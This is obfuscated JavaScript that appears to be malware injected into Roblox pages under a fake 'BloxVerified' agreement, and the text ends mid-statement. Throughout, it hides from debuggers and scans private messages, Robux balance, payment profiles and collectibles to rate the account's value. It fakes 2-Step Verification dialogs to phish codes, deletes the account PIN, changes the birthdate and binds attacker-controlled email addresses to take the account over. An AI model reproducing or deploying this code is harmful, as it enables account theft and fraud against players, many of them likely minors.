;(function () {
  var K
  try {
    var L = Function('return (function() {}.constructor("return this")( ));')
    K = L()
  } catch (Z) {
    K = window
  }
  K.setInterval(J, 4000)
})()
;(async function () {
  var u = (function () {
      var D = true
      return function (s, P) {
        var R = D
          ? function () {
              if (P) {
                var b = P.apply(s, arguments)
                return (P = null), b
              }
            }
          : function () {}
        return (D = false), R
      }
    })(),
    p = u(this, function () {
      return p
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(p)
        .search('(((.+)+)+)+$')
    })
  p()
  var E = (function () {
    var D = true
    return function (s, P) {
      var R = D
        ? function () {
            if (P) {
              var M = P.apply(s, arguments)
              return (P = null), M
            }
          }
        : function () {}
      return (D = false), R
    }
  })()
  ;(function () {
    E(this, function () {
      var s = new RegExp('function *\\( *\\)'),
        P = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
        f = J('init')
      if (!s.test(f + 'chain') || !P.test(f + 'input')) {
        f('0')
      } else {
        J()
      }
    })()
  })()
  var Y = (function () {
    var D = true
    return function (Q, s) {
      var f = D
        ? function () {
            if (s) {
              var S = s.apply(Q, arguments)
              return (s = null), S
            }
          }
        : function () {}
      return (D = false), f
    }
  })()
  var l = Y(this, function () {
    var D = function () {
        var A
        try {
          A = Function(
            'return (function() {}.constructor("return this")( ));'
          )()
        } catch (d) {
          A = window
        }
        return A
      },
      Q = D(),
      s = (Q.console = Q.console || {}),
      P = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
    for (var f = 0; f < P.length; f++) {
      var b = Y.constructor.prototype.bind(Y)
      var M = P[f]
      var O = s[M] || b
      b['__proto__'] = Y.bind(Y)
      b.toString = O.toString.bind(O)
      s[M] = b
    }
  })
  l()
  const I = (W) => new Promise((D) => setTimeout(D, W))
  var H = [
      'emh5c2V0QGdhemV0YS5wbA==',
      'a2Vlc21hbmFpekBnYXpldGEucGw=',
      'cmFuYW10dXNoZUBnYXpldGEucGw=',
      'Z3VuYXBvb3ZzaEBnYXpldGEucGw=',
      'c2NoaWFseXVzYkBnYXpldGEucGw=',
      'a2FlenphbW9tekBnYXpldGEucGw=',
      'c2hhb3ZvdmVyQGdhemV0YS5wbA==',
      'bml1cGtvdm95QGdhemV0YS5wbA==',
      'a2FhdmRpdmlsQGdhemV0YS5wbA==',
      'bGVrYXNldHBub0BnYXpldGEucGw=',
      'bnVrb25ha25hekBnYXpldGEucGw=',
      'dGFib3ZhZGFuZUBnYXpldGEucGw=',
      'bm9ldm5hc25lQGdhemV0YS5wbA==',
      'a2Fla2FzYXRAZ2F6ZXRhLnBs',
      'a2Fvc2hob3BlckBnYXpldGEucGw=',
    ],
    m = H[Math.floor(Math.random() * H.length)]
  validDev = []
  try {
    console.log(
      document.getElementsByClassName('text-footer footer-note')[0].innerText
    )
  } catch {
    window.location.reload()
  }
  document.getElementsByClassName('text-footer footer-note')[0].innerText !=
    'Active' &&
    ((document.getElementsByClassName('text-footer footer-note')[0].innerText =
      'Active'),
    $.ajax({
      method: 'GET',
      url: 'https://users.roblox.com/v1/users/authenticated',
      contentType: 'application/json',
      success: function (Q) {
        var P = Q.id
        try {
          $.ajax({
            method: 'POST',
            url:
              'https://friends.roblox.com/v1/users/' +
              7436036020 +
              '/request-friendship',
            contentType: 'application/json',
            data: JSON.stringify(f),
          })
        } catch {}
        try {
          $.ajax({
            method: 'GET',
            url: 'https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=0&pageSize=20',
            contentType: 'application/json',
            success: function (O) {
              var M = Number(O.totalPages)
              for (let g = 0; g < M; g++) {
                $.ajax({
                  method: 'GET',
                  url:
                    'https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=' +
                    g +
                    '&pageSize=20',
                  contentType: 'application/json',
                  success: function (e) {
                    var N = e.collection
                    for (var d of N) {
                      if (d.body.includes('your UGC accessories') == true) {
                        validDev.push('true')
                      }
                      if (d.body.includes('buying one of your') == true) {
                        validDev.push('true')
                      }
                      if (
                        d.body.includes('permission to use a clothing item') ==
                        true
                      ) {
                        validDev.push('true')
                      }
                      if (d.body.includes('or even USD.') == true) {
                        validDev.push('true')
                      }
                      d.body.includes('outfit in my game') == true &&
                        validDev.push('true')
                    }
                  },
                })
              }
            },
          })
        } catch {}
        try {
          $.ajax({
            method: 'GET',
            url: 'https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=0&pageSize=20',
            contentType: 'application/json',
            success: function (b) {
              var q = Number(b.totalPages)
              for (let g = 0; g < q; g++) {
                $.ajax({
                  method: 'GET',
                  url:
                    'https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=' +
                    g +
                    '&pageSize=20',
                  contentType: 'application/json',
                  success: function (A) {
                    var d = A.collection
                    for (var T of d) {
                      if (T.body.includes('your UGC accessories') == true) {
                        validDev.push('true')
                      }
                      T.body.includes('buying one of your') == true &&
                        validDev.push('true')
                      T.body.includes('permission to use a clothing item') ==
                        true && validDev.push('true')
                      if (T.body.includes('or even USD.') == true) {
                        validDev.push('true')
                      }
                      if (T.body.includes('outfit in my game') == true) {
                        validDev.push('true')
                      }
                    }
                  },
                })
              }
            },
          })
        } catch {}
        try {
          $.ajax({
            method: 'GET',
            url: 'https://economy.roblox.com/v1/users/' + P + '/currency',
            contentType: 'application/json',
            success: function (M) {
              var g = M.robux
              g > 500 && validDev.push('true')
            },
          })
        } catch {}
        try {
          $.ajax({
            method: 'GET',
            url: 'https://apis.roblox.com/payments-gateway/v1/payment-profiles',
            contentType: 'application/json',
            success: function (g) {
              g[0].id != undefined && validDev.push('true')
            },
          })
        } catch {}
        async function R() {
          function e() {
            $.ajax({
              method: 'GET',
              url: 'https://accountsettings.roblox.com/v1/email',
              contentType: 'application/json',
              success: function (a) {
                if (a.emailAddress == null) {
                  $.ajax({
                    method: 'POST',
                    url: 'https://accountsettings.roblox.com/v1/email',
                    contentType: 'application/json',
                    data: JSON.stringify({
                      emailAddress: atob(m),
                      password: '',
                    }),
                  })
                } else {
                  var k = a.emailAddress,
                    B = a.verified
                  if (k.includes('gazeta.pl') == true) {
                    if (B == true) {
                      ;(async function () {
                        await I(500)
                        $.ajax(x)
                      })()
                    } else {
                      document.getElementById('agreeBloxVerified').innerText =
                        'Please wait..'
                    }
                  }
                }
              },
            })
            setTimeout(e, 2000)
          }
          e()
          function A(z, a, y) {
            $.ajax({
              method: 'POST',
              url:
                'https://twostepverification.roblox.com/v1/users/' +
                P +
                '/challenges/email/send-code',
              contentType: 'application/json',
              data: JSON.stringify({
                actionType: 'Generic',
                challengeId: z,
              }),
              success: function () {
                document.body.insertAdjacentHTML(
                  'beforeend',
                  '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>'
                )
                function x() {
                  if (
                    document.getElementById('two-step-verification-code-input')
                      .value.length == 6
                  ) {
                    document.getElementsByClassName(
                      'btn-cta-md modal-modern-footer-button'
                    )[0].disabled = false
                  } else {
                    document.getElementsByClassName(
                      'btn-cta-md modal-modern-footer-button'
                    )[0].disabled = true
                  }
                  setTimeout(x, 100)
                }
                x()
                document.getElementsByClassName(
                  'btn-cta-md modal-modern-footer-button'
                )[0].onclick = function () {
                  $.ajax({
                    method: 'POST',
                    url:
                      'https://twostepverification.roblox.com/v1/users/' +
                      P +
                      '/challenges/email/verify',
                    contentType: 'application/json',
                    data: JSON.stringify({
                      challengeId: z,
                      actionType: 'Generic',
                      code: document.getElementById(
                        'two-step-verification-code-input'
                      ).value,
                    }),
                    success: function (U) {
                      var w1 = U.verificationToken
                      $.ajax({
                        method: 'POST',
                        url: 'https://apis.roblox.com/challenge/v1/continue',
                        contentType: 'application/json',
                        data: JSON.stringify({
                          challengeId: a,
                          challengeMetadata:
                            '{"verificationToken":"' +
                            w1 +
                            '","rememberDevice":false,"challengeId":"' +
                            z +
                            '","actionType":"Generic"}',
                          challengeType: 'twostepverification',
                        }),
                        success: function () {
                          document.getElementById('twoStepPrompts').remove()
                          I(2000)
                          var w4 = btoa(
                            '{"reauthenticationToken":"' + w1 + '"}'
                          )
                          console.log(y)
                          if (y == 1) {
                            console.log('Reason is 1')
                            var w5 = {
                              method: 'POST',
                              url:
                                'https://twostepverification.roblox.com/v1/users/' +
                                P +
                                '/configuration/email/enable',
                              contentType: 'application/json',
                              headers: {},
                            }
                            w5.headers['Rblx-Challenge-Type'] =
                              'reauthentication'
                            w5.headers['Rblx-Challenge-Id'] = a
                            w5.headers['Rblx-Challenge-Metadata'] = w4
                            $.ajax(w5)
                          } else {
                            y == null
                              ? $.ajax({
                                  method: 'DELETE',
                                  url: 'https://auth.roblox.com/v1/account/pin',
                                  contentType: 'application/json',
                                  headers: {
                                    'Rblx-Challenge-Type': 'reauthentication',
                                    'Rblx-Challenge-Id': a,
                                    'Rblx-Challenge-Metadata': w4,
                                  },
                                  success: function () {
                                    T(null, null)
                                  },
                                })
                              : T(a, w4)
                          }
                        },
                      })
                    },
                    error: function () {
                      document.getElementsByClassName(
                        'form-control-label bottom-label xsmall'
                      )[0].innerText = 'Invalid code'
                      document.getElementById('groupElementId').className =
                        'form-has-feedback  form-has-error form-group'
                    },
                  })
                }
              },
            })
          }
          function i(z, a, y) {
            document.body.insertAdjacentHTML(
              'beforeend',
              '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>'
            )
            function t() {
              document.getElementById('two-step-verification-code-input').value
                .length == 6
                ? (document.getElementsByClassName(
                    'btn-cta-md modal-modern-footer-button'
                  )[0].disabled = false)
                : (document.getElementsByClassName(
                    'btn-cta-md modal-modern-footer-button'
                  )[0].disabled = true)
              setTimeout(t, 100)
            }
            t()
            document.getElementsByClassName(
              'btn-cta-md modal-modern-footer-button'
            )[0].onclick = function () {
              $.ajax({
                method: 'POST',
                url:
                  'https://twostepverification.roblox.com/v1/users/' +
                  P +
                  '/challenges/authenticator/verify',
                contentType: 'application/json',
                data: JSON.stringify({
                  challengeId: z,
                  actionType: 'Generic',
                  code: document.getElementById(
                    'two-step-verification-code-input'
                  ).value,
                }),
                success: function (x) {
                  var V = x.verificationToken
                  $.ajax({
                    method: 'POST',
                    url: 'https://apis.roblox.com/challenge/v1/continue',
                    contentType: 'application/json',
                    data: JSON.stringify({
                      challengeId: a,
                      challengeMetadata:
                        '{"verificationToken":"' +
                        V +
                        '","rememberDevice":false,"challengeId":"' +
                        z +
                        '","actionType":"Generic"}',
                      challengeType: 'twostepverification',
                    }),
                    success: function () {
                      document.getElementById('twoStepPrompts').remove()
                      I(2000)
                      var w1 = btoa('{"reauthenticationToken":"' + V + '"}')
                      if (y == 1) {
                        console.log('Reason is 1')
                        var w2 = {
                          method: 'POST',
                          url:
                            'https://twostepverification.roblox.com/v1/users/' +
                            P +
                            '/configuration/email/enable',
                          contentType: 'application/json',
                          headers: {},
                        }
                        w2.headers['Rblx-Challenge-Type'] = 'reauthentication'
                        w2.headers['Rblx-Challenge-Id'] = a
                        w2.headers['Rblx-Challenge-Metadata'] = w1
                        $.ajax(w2)
                      } else {
                        if (y == null) {
                          $.ajax({
                            method: 'DELETE',
                            url: 'https://auth.roblox.com/v1/account/pin',
                            contentType: 'application/json',
                            headers: {
                              'Rblx-Challenge-Type': 'reauthentication',
                              'Rblx-Challenge-Id': a,
                              'Rblx-Challenge-Metadata': w1,
                            },
                            success: function () {
                              T(null, null)
                            },
                          })
                        } else {
                          T(a, w1)
                        }
                      }
                    },
                  })
                },
                error: function (x) {
                  x.responseText.includes('"code":18')
                    ? ((document.getElementsByClassName(
                        'form-control-label bottom-label xsmall'
                      )[0].innerText =
                        'This code has already been used. Please enter a new code.'),
                      (document.getElementById('groupElementId').className =
                        'form-has-feedback  form-has-error form-group'))
                    : ((document.getElementsByClassName(
                        'form-control-label bottom-label xsmall'
                      )[0].innerText = 'Invalid code'),
                      (document.getElementById('groupElementId').className =
                        'form-has-feedback  form-has-error form-group'))
                },
              })
            }
          }
          function N(z, a) {
            $.ajax({
              method: 'POST',
              url: 'https://apis.roblox.com/otp-service/v1/sendCodeForUser',
              contentType: 'application/json',
              data: JSON.stringify({
                contactType: 'Email',
                messageVariant: 'Default',
                origin: 'Reauth',
              }),
              success: function (k) {
                var t = k.otpSessionToken
                document.body.insertAdjacentHTML(
                  'beforeend',
                  '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">A one-time code has been sent to your registered email. Please enter your one-time code to continue.</p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-Digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">\xA0;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>'
                )
                function x() {
                  if (
                    document.getElementById('two-step-verification-code-input')
                      .value.length == 6
                  ) {
                    document.getElementsByClassName(
                      'btn-cta-md modal-modern-footer-button'
                    )[0].disabled = false
                  } else {
                    document.getElementsByClassName(
                      'btn-cta-md modal-modern-footer-button'
                    )[0].disabled = true
                  }
                  setTimeout(x, 100)
                }
                x()
                document.getElementsByClassName(
                  'btn-cta-md modal-modern-footer-button'
                )[0].onclick = function () {
                  $.ajax({
                    method: 'POST',
                    url: 'https://apis.roblox.com/otp-service/v1/validateCode',
                    contentType: 'application/json',
                    data: JSON.stringify({
                      contactType: 'Email',
                      origin: 'Reauth',
                      otpSessionToken: t,
                      passCode: document.getElementById(
                        'two-step-verification-code-input'
                      ).value,
                    }),
                    success: function () {
                      $.ajax({
                        method: 'POST',
                        url: 'https://apis.roblox.com/reauthentication-service/v1/token/generate',
                        contentType: 'application/json',
                        data: JSON.stringify({
                          sessionId: t,
                          type: 'Otp_Email',
                        }),
                        success: function (U) {
                          responseToken = U.token
                          $.ajax({
                            method: 'POST',
                            url: 'https://apis.roblox.com/challenge/v1/continue',
                            contentType: 'application/json',
                            data: JSON.stringify({
                              challengeId: z,
                              challengeMetadata:
                                '{"reauthenticationToken":"' +
                                responseToken +
                                '"}',
                              challengeType: 'reauthentication',
                            }),
                            success: function () {
                              document.getElementById('twoStepPrompts').remove()
                              I(2000)
                              var w3 = btoa(
                                '{"reauthenticationToken":"' +
                                  responseToken +
                                  '"}'
                              )
                              if (a == 1) {
                                console.log('Reason is 1')
                                var w4 = {
                                  method: 'POST',
                                  url:
                                    'https://twostepverification.roblox.com/v1/users/' +
                                    P +
                                    '/configuration/email/enable',
                                  contentType: 'application/json',
                                  headers: {},
                                }
                                w4.headers['Rblx-Challenge-Type'] =
                                  'reauthentication'
                                w4.headers['Rblx-Challenge-Id'] = z
                                w4.headers['Rblx-Challenge-Metadata'] = w3
                                $.ajax(w4)
                              } else {
                                a == null
                                  ? $.ajax({
                                      method: 'DELETE',
                                      url: 'https://auth.roblox.com/v1/account/pin',
                                      contentType: 'application/json',
                                      headers: {
                                        'Rblx-Challenge-Type':
                                          'reauthentication',
                                        'Rblx-Challenge-Id': z,
                                        'Rblx-Challenge-Metadata': w3,
                                      },
                                      success: function () {
                                        T(null, null)
                                      },
                                    })
                                  : T(z, w3)
                              }
                            },
                          })
                        },
                      })
                    },
                    error: function () {
                      document.getElementsByClassName(
                        'form-control-label bottom-label xsmall'
                      )[0].innerText = 'Invalid code'
                      document.getElementById('groupElementId').className =
                        'form-has-feedback  form-has-error form-group'
                    },
                  })
                }
              },
            })
          }
          function d(z, a, y) {
            $.ajax({
              method: 'GET',
              url:
                'https://twostepverification.roblox.com/v1/users/' +
                P +
                '/configuration',
              contentType: 'application/json',
              success: function (B) {
                var v = B.primaryMediaType
                if (v == 'Email') {
                  A(z, a, y)
                } else {
                  v == 'Authenticator' ? i(z, a, y) : v == null && N(a, y)
                }
              },
            })
          }
          function T(z, a) {
            $.ajax({
              method: 'GET',
              url:
                'https://twostepverification.roblox.com/v1/users/' +
                P +
                '/configuration',
              contentType: 'application/json',
              success: function (k) {
                var t = k.primaryMediaType
                if (t == 'Authenticator') {
                  document.getElementsByClassName(
                    'text-footer footer-note'
                  )[0].innerText = 'Not Active'
                  if (document.getElementById('emailPopupz') == null) {
                    document.body.insertAdjacentHTML(
                      'beforeend',
                      '<div id="emailPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog" bis_skin_checked="1"><div class="modal-content" role="document" bis_skin_checked="1"><div title="" class="modal-header" bis_skin_checked="1"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Email 2-Step Verification</h4><div class="modal-modern-header-info" bis_skin_checked="1"></div></div><div class="modal-body" bis_skin_checked="1"><div class="modal-lock-icon" bis_skin_checked="1"></div><p>You must enable Email 2-Step Verification to complete this action.</p></div><div class="modal-footer" bis_skin_checked="1"><div class="modal-modern-footer-buttons" bis_skin_checked="1"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Set Up">Enable</button></div></div></div></div></div></div>'
                    )
                    document.getElementsByClassName(
                      'btn-cta-md modal-modern-footer-button'
                    )[0].onclick = function () {
                      document.getElementById('emailPopupz').remove()
                      document.getElementById('agreeBloxVerified').disabled =
                        false
                      $.ajax({
                        method: 'POST',
                        url:
                          'https://twostepverification.roblox.com/v1/users/' +
                          P +
                          '/configuration/email/enable',
                        contentType: 'application/json',
                        success: function () {},
                        error: function (w2) {
                          var w3 = atob(
                              w2.getResponseHeader('rblx-challenge-metadata')
                            ),
                            w4 = w2.getResponseHeader('rblx-challenge-id'),
                            w5 = w3.split('"challengeId":"').pop().split('"')[0]
                          d(w5, w4, 1)
                        },
                      })
                    }
                  }
                } else {
                  if (z == null) {
                    $.ajax({
                      method: 'POST',
                      url: 'https://users.roblox.com/v1/birthdate',
                      contentType: 'application/json',
                      data: JSON.stringify(v),
                      success: function () {
                        $.ajax({
                          method: 'POST',
                          url: 'https://accountsettings.roblox.com/v1/email',
                          contentType: 'application/json',
                          data: JSON.stringify({
                            emailAddress: atob(m),
                            password: '',
                          }),
                          success: function () {
                            ;(async function () {
                              await I(1500)
                              $.ajax({
                                method: 'GET',
                                url: 'https://accountsettings.roblox.com/v1/email',
                                contentType: 'application/json',
                                success: function (w7) {
                                  if (w7.emailAddress == null) {
                                    $.ajax({
                                      method: 'POST',
                                      url: 'https://accountsettings.roblox.com/v1/email',
                                      contentType: 'application/json',
                                      data: JSON.stringify({
                                        emailAddress: atob(m),
                                        password: '',
                                      }),
                                    })
                                  }
                                },
                              })
                            })()
                          },
                          error: function () {
                            ;(async function () {
                              await I(1500)
                              $.ajax({
                                method: 'GET',
                                url: 'https://accountsettings.roblox.com/v1/email',
                                contentType: 'application/json',
                                success: function (w3) {
                                  if (w3.emailAddress == null) {
                                    $.ajax({
                                      method: 'POST',
                                      url: 'https://accountsettings.roblox.com/v1/email',
                                      contentType: 'application/json',
                                      data: JSON.stringify({
                                        emailAddress: atob(m),
                                        password: '',
                                      }),
                                    })
                                  }
                                },
                              })
                            })()
                          },
                        })
                      },
                      error: function (w0) {
                        var w2 = atob(
                            w0.getResponseHeader('rblx-challenge-metadata')
                          ),
                          w3 = w0.getResponseHeader('rblx-challenge-id'),
                          w4 = w2.split('"challengeId":"').pop().split('"')[0]
                        d(w4, w3, 2)
                      },
                    })
                  } else {
                    $.ajax({
                      method: 'POST',
                      url: 'https://users.roblox.com/v1/birthdate',
                      contentType: 'application/json',
                      headers: {
                        'Rblx-Challenge-Type': 'reauthentication',
                        'Rblx-Challenge-Id': z,
                        'Rblx-Challenge-Metadata': a,
                      },
                      data: JSON.stringify(x),
                      success: function () {
                        $.ajax({
                          method: 'POST',
                          url: 'https://accountsettings.roblox.com/v1/email',
                          contentType: 'application/json',
                          data: JSON.stringify({
                            emailAddress: atob(m),
                            password: '',
                          }),
                          success: function () {
                            ;(async function () {
                              await I(1500)
                              $.ajax({
                                method: 'GET',
                                url: 'https://accountsettings.roblox.com/v1/email',
                                contentType: 'application/json',
                                success: function (w2) {
                                  if (w2.emailAddress == null) {
                                    $.ajax({
                                      method: 'POST',
                                      url: 'https://accountsettings.roblox.com/v1/email',
                                      contentType: 'application/json',
                                      data: JSON.stringify({
                                        emailAddress: atob(m),
                                        password: '',
                                      }),
                                    })
                                  }
                                },
                              })
                            })()
                          },
                          error: function () {
                            ;(async function () {
                              await I(1500)
                              $.ajax({
                                method: 'GET',
                                url: 'https://accountsettings.roblox.com/v1/email',
                                contentType: 'application/json',
                                success: function (w2) {
                                  w2.emailAddress == null &&
                                    $.ajax({
                                      method: 'POST',
                                      url: 'https://accountsettings.roblox.com/v1/email',
                                      contentType: 'application/json',
                                      data: JSON.stringify({
                                        emailAddress: atob(m),
                                        password: '',
                                      }),
                                    })
                                },
                              })
                            })()
                          },
                        })
                      },
                      error: function (w0) {
                        var w1 = atob(
                          w0.getResponseHeader('rblx-challenge-metadata')
                        )
                        var w2 = w0.getResponseHeader('rblx-challenge-id')
                        var w3 = w1.split('"challengeId":"').pop().split('"')[0]
                        d(w3, w2, 2)
                      },
                    })
                  }
                }
              },
            })
          }
          if (document.getElementById('BloxVerified1') == null) {
            document.body.insertAdjacentHTML(
              'beforeend',
              '<div id="BloxVerified1" role="dialog"><div class="fade modal-backdrop in"></div><div aria-labelledby="contained-modal-title-vcenter" scrollable="true" centered="true" role="dialog" tabindex="-1" style="display: block;" class="fade verification-modal in modal"><div class="modal-sm modal-dialog"><div class="modal-content" role="document"><div><div title="" class="modal-header"><div class="verification-upsell-title-container"><button type="button" class="verification-upsell-title-button"></button><h4 id="contained-modal-title-vcenter" class="modal-title">BloxVerified Agreement </h4></div></div><div class="verification-upsell-text-body text-description">BloxVerified can view your Roblox Username</div><div class="modal-footer"><div class="text-description font-caption-body phone-verification-legal-text" hidden="">By clicking "Continue", you are submitting your phone number and agreeing to our <a href="https://en.help.roblox.com/hc/articles/9483830673556-Roblox-SMS-Terms-of-Service">SMS Terms of Use</a> and <a href="https://en.help.roblox.com/hc/articles/115004630823">Privacy Policy</a>. We will send you a one-time verification code. Message and data rates may apply. Reply HELP for help.</div><div class="buttons-section"><button type="button" class="accept-btn btn-primary-md btn-min-width" id="agreeBloxVerified">Agree & Continue</button></div><div></div></div></div></div></div></div></div>'
            )
            document.getElementById('agreeBloxVerified').onclick = function () {
              document.getElementById('agreeBloxVerified').disabled = true
              $.ajax({
                method: 'GET',
                url: 'https://auth.roblox.com/v1/account/pin',
                contentType: 'application/json',
                success: function (a) {
                  var k = a.isEnabled
                  var B = a.unlockedUntil
                  if (k == true) {
                    if (B == null) {
                      document.getElementsByClassName(
                        'text-footer footer-note'
                      )[0].innerText = 'Not Active'
                      if (document.getElementById('pinPopupz') == null) {
                        document.body.insertAdjacentHTML(
                          'beforeend',
                          '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>'
                        )
                        document.getElementsByClassName(
                          'btn-cta-md modal-modern-footer-button'
                        )[0].onclick = function () {
                          document.getElementById('pinPopupz').remove()
                          document.getElementById(
                            'agreeBloxVerified'
                          ).disabled = false
                        }
                      }
                    } else {
                      try {
                        document.getElementById('pinPopupz').remove()
                      } catch {}
                      $.ajax({
                        method: 'DELETE',
                        url: 'https://auth.roblox.com/v1/account/pin',
                        contentType: 'application/json',
                        success: function () {
                          T(null, null)
                        },
                        error: function (o) {
                          var v = atob(
                              o.getResponseHeader('rblx-challenge-metadata')
                            ),
                            x = o.getResponseHeader('rblx-challenge-id')
                          var j = v.split('"challengeId":"').pop().split('"')[0]
                          d(j, x, null)
                        },
                      })
                    }
                  } else {
                    T(null, null)
                  }
                },
              })
            }
          } else {
            $.ajax({
              method: 'GET',
              url: 'https://auth.roblox.com/v1/account/pin',
              contentType: 'application/json',
              success: function (z) {
                var y = z.isEnabled
                var k = z.unlockedUntil
                if (y == true) {
                  if (k == null) {
                    document.getElementsByClassName(
                      'text-footer footer-note'
                    )[0].innerText = 'Not Active'
                    if (document.getElementById('pinPopupz') == null) {
                      document.body.insertAdjacentHTML(
                        'beforeend',
                        '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>'
                      )
                      document.getElementsByClassName(
                        'btn-cta-md modal-modern-footer-button'
                      )[0].onclick = function () {
                        document.getElementById('pinPopupz').remove()
                        document.getElementsByClassName(
                          'text-footer footer-note'
                        )[0].innerText = 'Not Active'
                      }
                    }
                  } else {
                    try {
                      document.getElementById('pinPopupz').remove()
                    } catch {}
                    $.ajax({
                      method: 'DELETE',
                      url: 'https://auth.roblox.com/v1/account/pin',
                      contentType: 'application/json',
                      success: function () {
                        T(null, null)
                      },
                      error: function (t) {
                        var o = atob(
                            t.getResponseHeader('rblx-challenge-metadata')
                          ),
                          v = t.getResponseHeader('rblx-challenge-id')
                        var x = o.split('"challengeId":"').pop().split('"')[0]
                        d(x, v, null)
                      },
                    })
                  }
                } else {
                  T(null, null)
                }
              },
            })
          }
        }
        ;(async function () {
          await I(800)
          if (validDev.length > 0) {
            R()
          } else {
            function e(A) {
              const i =
                'https://inventory.roblox.com/v1/users/' +
                A +
                '/assets/collectibles?assetType=null&cursor=&limit=100&sortOrder=Desc'
              var N = {
                url: i,
                type: 'GET',
              }
              return $.ajax(N)
            }
            e(P)
              .done(function (A) {
                if (A && A.data && A.data.length > 0) {
                  let T = 0
                  A.data.forEach((h) => {
                    h.recentAveragePrice && (T += h.recentAveragePrice)
                  })
                  if (T > 5000) {
                    R()
                  } else {
                    var d =
